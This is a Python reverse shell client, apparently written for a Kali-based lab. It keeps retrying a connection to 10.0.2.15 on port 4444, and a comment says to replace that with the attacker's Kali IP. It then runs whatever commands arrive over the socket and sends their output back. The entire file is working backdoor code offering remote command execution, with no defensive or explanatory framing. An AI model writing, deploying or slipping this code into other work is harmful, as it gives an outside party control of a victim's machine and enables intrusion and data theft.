import socket
import json
import subprocess
import os
import base64
import time
import shlex
from pathlib import Path


def server_connect(ip, port):
	global connection
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while True:
		try:
			connection.connect((ip, port))
			break
		except ConnectionRefusedError:
			time.sleep(5)


def send(data):
	json_data = json.dumps(data)
	connection.send(json_data.encode('utf-8'))


def receive():
	json_data = ''
	while True:
		try:
			json_data += connection.recv(1024).decode('utf-8')
			return json.loads(json_data)
			
		except ValueError:
			continue


def processRequest(argList):
	# Check if argList is empty
	if len(argList) == 0:
		response = ""
	
	# Check if command is change dir
	elif argList[0] == 'cd':
		try:
			os.chdir(argList[1])
			response = f"Change directory to {os.getcwd()}\n"
			
		except Exception as e:
			response = f"cd error: {e}\n"
			
	# use subprocess to run command to capture both stdout and stderr
	else:
		try:
			# Execute the command on target
			result = subprocess.run(argList, capture_output=True, text=True, check=True)
			response = result.stdout + result.stderr
	    	
		except subprocess.CalledProcessError as e:
			response = f"Command execution error: {e}\n{e.stderr}"
	
	# Return the response	
	return response


def client_run():
	# Receive requests, Send responses
	while True:
		# Wait and receive request 
		request = receive()

		# Handle exit case
		if request == "exit":
			break
			

		# Split command into argument list
		requestArgs = shlex.split(request)


		# Process command
		response = processRequest(requestArgs)


		# Send response back to server
		send(response)
	
	return



def main():
	server_connect('10.0.2.15', 4444) #Replace 10.0.2.15 with your Kali IP

	client_run()




if __name__ == "__main__":
	main()
